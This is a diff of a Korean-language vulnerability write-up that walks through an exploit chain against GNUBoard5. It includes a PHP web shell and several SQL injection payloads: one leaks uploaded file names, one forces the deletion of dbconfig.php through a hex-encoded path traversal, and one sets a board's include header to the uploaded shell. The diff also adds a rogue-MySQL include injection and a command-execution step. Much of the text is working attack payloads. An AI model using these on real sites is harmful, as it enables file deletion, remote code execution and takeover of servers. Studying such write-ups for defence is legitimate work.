@@ -29,6 +29,10 @@ $move_write_table = $g5['write_prefix'] . $move_bo_table;</code></pre>
 
 >이때 간단한 웹 쉘 코드인 "<?php system($_GET['cmd']); ?>" 등의 코드를 작성하여 업로드 합니다.
 
+> 이후 다음과 같은 SQL Injecttion 페이로드 글의 내용을 조작하여 업로드된 진짜 파일명을 알아냅니다
+>"notice set wr_content=(select bf_file_name from g5_board_file where wr_id=1 and bo_table=0x6578706c6f6974)#"
+
+
 <pre><code>        if (!delete_point($row['mb_id'], $bo_table, $row['wr_id'], '쓰기'))
             insert_point($row['mb_id'], $board['bo_write_point'] * (-1), "{$board['bo_subject']} {$row['wr_id']} 글삭제");
 
@@ -46,7 +50,7 @@ $move_write_table = $g5['write_prefix'] . $move_bo_table;</code></pre>
         // 에디터 썸네일 삭제
         delete_editor_thumbnail($row['wr_content']);</code></pre>
 
->위는 당시와 비슷한 버전의 delete.php인데 위에서 insert 한 "g5_board_file" 테이블의 "bf_file" 컬럼의 값을 select하여 unlink 하는것을 알 수 있습니다.
+>위는 당시와 비슷한 버전의 글을 삭제하는 delete.php인데 위에서 insert 한 "g5_board_file" 테이블의 "bf_file" 컬럼의 값을 select하여 unlink 하는것을 알 수 있습니다.
 >이를 위의 SQL Injection을 이용하여 다음과 같은 페이로드를 이용하여 해당 게시글의 bf_file 컬럼의 값을 변경해주었습니다
 
 >"notice as a inner join `g5_board_file` as b set b.bf_file=0x2e2e2f646174612f6462636f6e6669672e706870 where wr_id=1 and bo_table=0x6e6f74696365#"
@@ -78,6 +82,10 @@ fwrite($f, "define('G5_TABLE_PREFIX', '{$table_prefix}');\n\n");</code></pre>
 
 > 이 때 "mysql_connect" 함수에서 정상적인 connection을 위해 php코드를 본인의 로컬 mysql 서버에 " ');include($_GET['foo']);// "와 같은 DB or PASSWORD를 셋팅해주고 외부접속을 허용합니다.
 
->이 후 dbconfig.php은 common.php에서 include하고 common.php는 거의 모든 파일에서 include하기 때문에 모든 파일에서 쉘을 실행할 수 있습니다.
+>이 후 index.php?foo=파일명&cmd=ls 를 하면 정상적으로 쉘을 획득할 수 있습니다.
 
->그누보드에서는 각각의 게시판마다 g5_board 테이블에 있는 bo_include_head,bo_include_head 컬럼들의 값을 각각 상단 파일,하단 파일로 include합니다
+## 다른 exploit 방법
+
+>그누보드에서는 각각의 게시판마다 g5_board 테이블에 있는 bo_include_head,bo_include_head 컬럼들의 값을 각각 상단 파일,하단 파일로 include합니다 때문에 다음과 같은 페이로드를 통해서 더욱 간단한 쉘 획득이 가능합니다.
+>"notice as a inner join g5_board as b set b.bo_incldue_head=concat(0x2e2e2f646174612f6578706c6f69742f,(select bf_file from g5_board_file where wr_id=글 번호
+))"
